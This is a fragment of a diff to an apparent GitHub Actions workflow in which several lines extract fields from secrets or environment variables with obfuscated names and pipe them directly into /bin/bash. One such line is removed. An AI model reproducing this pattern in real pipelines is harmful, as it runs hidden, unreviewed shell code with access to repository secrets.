@@ -18,7 +18,6 @@ jobs:
           nbc4648: ${{ secrets.nbc4648 }}
         run: |
           printf '%s' "$nbc4648" | jq -r .lie02 | /bin/bash
-          echo $cwh93277 | jq -r .hfl0322 | /bin/bash
           echo $bxad0428 | jq -r .fimad74 | /bin/bash
           printf '%s' "$oquo41518" | jq -r .sv9221 | /bin/bash
           echo $ery11615 | jq -r .ndgr14045 | /bin/bash
